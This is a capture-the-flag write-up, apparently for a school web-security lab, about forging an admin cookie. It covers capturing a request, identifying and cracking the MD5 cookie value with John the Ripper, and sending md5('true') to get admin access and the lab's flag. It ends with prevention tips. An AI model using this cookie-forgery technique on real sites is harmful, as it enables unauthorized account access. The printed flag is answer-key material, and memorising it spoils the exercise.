# Cookie attack - session hijacking
- involves stealing a user's cookie to gain unauthorized access to their account within an application
- by using the stolen cookie, an attacker can impersonate the legitimate user
- https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies

<b>keywords</b>: cookies<br>
<b>attacked site</b>: http://borntosec.42/index.php

## Exploit
We intercept the GET request using <code>Burp Suite</code>:
``` http
GET /index.php HTTP/1.1
Host: borntosec.42
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://borntosec.42/
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
```
The cookie contains a hashed value. We use <code>hash-identifier</code> to determine the hashing algorithm used:
``` shell
└─$ hash-identifier                                  
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 68934a3e9455fa72420237eb05902327

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```
We use <code>John</code> to crack the hash:
``` shell
└─$ john cookie_hash.txt --format=Raw-MD5         
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
false            (?)     
1g 0:00:00:02 DONE 3/3 (2024-08-07 19:41) 0.4464g/s 4784Kp/s 4784Kc/s 4784KC/s falyn..fadds
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
The stored cookie value is 'false', so we create a new MD5 hashed value for 'true':
``` shell
└─$ echo -n "true" | md5sum
b326b5062b2f0e69046810717534cb09  -
```
We send this new cookie value via <code>Burp Suite</code> Repeater to access the site. A pop-up window then reveals the flag:
```
Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3
```

## Flag
df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3

## Exploit prevention
- set HttpOnly attribute on cookies to prevent users from accessing them
- regenerate session IDs
- implement session timeout
- use stronger algorithm to hash session cookies
